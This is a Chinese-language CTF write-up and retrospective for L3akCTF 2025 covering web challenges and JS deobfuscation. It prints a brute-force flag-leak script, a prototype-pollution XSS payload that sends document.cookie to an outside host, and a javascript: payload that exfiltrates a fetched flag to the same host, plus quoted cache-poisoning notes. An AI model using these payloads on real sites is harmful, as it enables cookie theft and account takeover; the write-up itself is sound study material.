---
title: L3akCTF2025 Writeup & 复盘
date: 2025-07-28T16:25:41+08:00
tags:
  - CTF Writeup
---
拿到468分，取得493名的垫底成绩。

# Flag L3ak

```js
    const matchingPosts = posts
        .filter(post => 
            post.title.includes(query) ||
            post.content.includes(query) ||
            post.author.includes(query)
        )
        .map(post => ({
            ...post,
            content: post.content.replace(FLAG, '*'.repeat(FLAG.length))
    }));
```

大意是有一个flag，但flag会被替换成`*`，然后限制输入内容不得大于3个字符。

虽然看不到flag，但是注意到如果`query`的内容包含flag，那么对应结果也会被返回，即使看不到flag

通过*两个已知字符+一个未知字符*的方式可以逐位leak出flag。

```js
const url = "http://34.134.162.213:17000/api/search"

const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_!@#$%^&*()-=+[]{}|;:',.<>?/~`\"";
////////////////************************
const prefix = "L3AK{L3ak1ng_th3_Fl4g??}"

;(async()=>{
    for (let i = 0; i < charset.length; i++) {
        const char = charset[i];
        const query = prefix.substring(prefix.length-2) + char;
  
        try {
            const response = fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ query })
            }).then(res => res.json()).then(
                data=>{
            
            console.log(`Character: ${char}, Response:`, data.count, data.count>0?"<--------------- FOUND":"");
                }
            );
        } catch (error) {
            console.error(`Error fetching for character ${char}:`, error);
        }
    }
})()
```

想到一个东西，如果flag中包含多于2种的>3个连续相同字符，那这个方案会解决不了，虽然题目中没有出现。

# NotoriousNote

```js
document.addEventListener('DOMContentLoaded', function() {
    const [_, query] = [window.location, QueryArg.parseQuery(window.location.search)];
    const { note: n } = query;

    const actions = [
        () => console.debug(n), 
        () => {
            const el = document.getElementById('notesPlaceholder');
            if (n) {
                const renderNote = txt => `<div class="note-item">${sanitizeHtml(txt)}</div>`;
                el.innerHTML += renderNote(n);
            }
        }
    ];

    actions.forEach(fn => fn());
});
```

这个理论上就应该是XSS了，不过这边看起来没啥问题。

除了核心，还包含了两个js文件

一个`sanitize-html.min.js`，看了下是官方库+最新版，不像有洞的样子

另一个`Query.js`，定义了一个叫QueryArg的函数。查了npm没找到这个库，那么应该是自己写的了。直接拖给LLM看了一下，说有很严重的prototype polution风险

查到了这篇文章：[原型污染-并绕过客户端HTML过滤器-先知社区](https://xz.aliyun.com/news/7896)，说的就是用原型链污染绕过sanitize-html的

总之构造出payload：``/?__proto__.*=onload&note=<iframe onload="javascript:fetch(`https://dev.5dbwat4.top/r/${document.cookie}`)"></iframe>``

拿到flag：`L3AK{v1b3_c0d1n9_w3nt_t00_d33p_4nd_3nd3d_1n_xss}`

# Window of Opportunity

这不是当初ACTF 2025那道Note的非预期解吗

大概就是

```js
  await page.evaluate((targetUrl) => {
    window.open(targetUrl, "_blank");
  }, url);
```

这个行为会让新打开的窗口继承父窗口的上下文（这里主要是要利用它的cookie），因此可以利用这个特性。

payload：`javascript:fetch('/get_flag').then(v=>v.text()).then(v=>{fetch('https://dev.5dbwat4.top/aaa-'+v)})`

---

看了官方solution，他是自己新写了一个页面，然后用`window.opener`操作父窗口来获取flag。

# Others

然后还做出了一道geosint，一道Misc（`Solve the puzzles, shouldnt take more than 10 minutes to do by hand`），以及一道AI直出的Crypto题

# 复盘

主要是想看看Reverse里的两道JS Obfuscation题目，以及剩下来的Web题。

## not-a-vm

```js
const originalApply = Function.prototype.apply;
Function.prototype.apply = function (thisArg, args) {
  console.log(args?.[0])
  return originalApply.call(this, thisArg, args);
};
```

经典函数钩子

## gitbad

SSRF，用的是git submodule实现的

另外是这里也出现了和L3HCTF一样的cache-poisoning用法

（连续几次出现可以直接鉴定为常用技巧了）

查了一下cache-poisoning [Cache Poisoning and Cache Deception - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/cache-deception/index.html)

With the parameter/header identified check how it is being **sanitised** and **where** is it **getting reflected** or affecting the response from the header. Can you abuse it anyway (perform an XSS or load a JS code controlled by you? perform a DoS?...)

Once you have **identified** the **page** that can be abused, which **parameter**/**header** to use and **how** to **abuse** it, you need to get the page cached. Depending on the resource you are trying to get in the cache this could take some time, you might need to be trying for several seconds.

The header **`X-Cache`** in the response could be very useful as it may have the value **`miss`** when the request wasn't cached and the value **`hit`** when it is cached.
The header **`Cache-Control`** is also interesting to know if a resource is being cached and when will be the next time the resource will be cached again: `Cache-Control: public, max-age=1800`

Another interesting header is **`Vary`**. This header is often used to **indicate additional headers** that are treated as **part of the cache key** even if they are normally unkeyed. Therefore, if the user knows the `User-Agent` of the victim he is targeting, he can poison the cache for the users using that specific `User-Agent`.

One more header related to the cache is **`Age`**. It defines the times in seconds the object has been in the proxy cache.

When caching a request, be **careful with the headers you use** because some of them could be **used unexpectedly** as **keyed** and the **victim will need to use that same header**. Always **test** a Cache Poisoning with **different browsers** to check if it's working.
